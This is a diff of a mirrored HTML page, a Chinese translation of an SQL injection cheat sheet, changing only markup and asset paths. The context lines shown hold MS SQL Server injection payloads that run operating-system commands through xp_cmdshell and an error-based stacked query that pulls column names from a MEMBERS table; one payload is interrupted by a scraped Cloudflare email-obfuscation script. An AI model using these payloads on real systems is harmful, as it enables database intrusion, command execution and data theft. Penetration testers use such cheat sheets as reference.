@@ -3,18 +3,18 @@
 			<head>
 			     <title>SQL注入速查表（上） - Yinz</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/7840">http://drops.wooyun.org/tips/7840</a></h1>
 				
       <p>
-        <p><small><em>本文由Yinzo翻译，转载请保留署名。原文地址：<a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell">http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell</a></em></small></p>
+        </p><p><small><em>本文由Yinzo翻译，转载请保留署名。原文地址：<a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell">http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell</a></em></small></p>
 
 <p><small><em>文档版本：1.4</em></small></p>
 
 <h1>0x00 关于SQL注入速查表</h1>
 
-<hr />
+<hr>
 
 <p>现在仅支持MySQL、Microsoft SQL Server，以及一部分ORACLE和PostgreSQL。大部分样例都不能保证每一个场景都适用。现实场景由于各种插入语、不同的代码环境以及各种不常见甚至奇特的SQL语句，而经常发生变化。</p>
 
@@ -39,7 +39,7 @@
 
 <h1>0x01 目录</h1>
 
-<hr />
+<hr>
 
 <ol>
 <li>关于SQL注入速查表</li>
@@ -134,7 +134,7 @@
 
 <h1>0x02 语法参考，攻击样例以及注入小技巧</h1>
 
-<hr />
+<hr>
 
 <h3>行间注释</h3>
 
@@ -214,7 +214,7 @@
 
 <p><strong>绿色：</strong>支持，<strong>暗灰色：</strong>不支持，<strong>浅灰色：</strong>未知</p>
 
-<p><img src="http://static.wooyun.org//drops/20150819/2015081902360042624.jpg" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2015081902360042624.jpg" alt="enter image description here"></p>
 
 <h4>关于MySQL和PHP</h4>
 
@@ -582,8 +582,8 @@ exec xp_webserver</code></p></li>
 
 <p><code>DECLARE @result int; EXEC @result = xp_cmdshell 'dir *.exe';IF (@result = 0) SELECT 0 ELSE SELECT 1/0</code></p>
 
-<p>HOST&#95;NAME() IS&#95;MEMBER (Transact-SQL)<br />
-IS_SRVROLEMEMBER (Transact-SQL)<br />
+<p>HOST&#95;NAME() IS&#95;MEMBER (Transact-SQL)<br>
+IS_SRVROLEMEMBER (Transact-SQL)<br>
 OPENDATASOURCE (Transact-SQL)</p>
 
 <p><code>INSERT tbl EXEC master..xp_cmdshell OSQL /Q"DBCC SHOWCONTIG"</code></p>
@@ -633,9 +633,9 @@ OPENDATASOURCE (Transact-SQL)</p>
 
 <h3>快速的脱掉基于错误(Error Based)的SQL Server注入(S)</h3>
 
-<p><code>';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a2d0c69fe2d0c6">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name&gt;@rd SELECT @rd AS rd into TMP_SYS_TMP end;--</code></p>
+<p><code>';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a2d0c69fe2d0c6">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name&gt;@rd SELECT @rd AS rd into TMP_SYS_TMP end;--</code></p>
 
-<p><strong>详情请参考：<a href="http://ferruh.mavituna.com/makale/fast-way-to-extract-data-from-error-based-sql-injections/">Fast way to extract data from Error Based SQL Injections</a></strong></p>      </p>
+<p><strong>详情请参考：<a href="http://ferruh.mavituna.com/makale/fast-way-to-extract-data-from-error-based-sql-injections/">Fast way to extract data from Error Based SQL Injections</a></strong></p>      <p></p>
     
 			</body>
 		</html>
